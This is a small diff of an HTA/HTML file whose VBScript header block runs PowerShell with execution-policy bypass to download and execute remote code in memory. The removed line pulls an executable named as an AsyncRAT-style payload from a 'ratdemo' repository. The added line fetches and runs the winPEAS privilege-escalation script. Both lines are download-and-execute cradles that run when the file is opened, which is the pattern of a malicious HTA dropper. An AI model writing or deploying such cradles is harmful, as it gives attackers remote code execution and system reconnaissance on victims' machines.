@@ -2,7 +2,7 @@
 <HEAD> 
 <script language="VBScript">
     Set objShell = CreateObject("Wscript.Shell")
-    objShell.Run "powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://github.com/igigis/ratdemo/blob/main/AsyncPayload.exe')"
+    objShell.Run "powershell -Exec ByPass -NoProfile -c "(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1') | IEX""
 </script>
 </HEAD> 
 <BODY> 
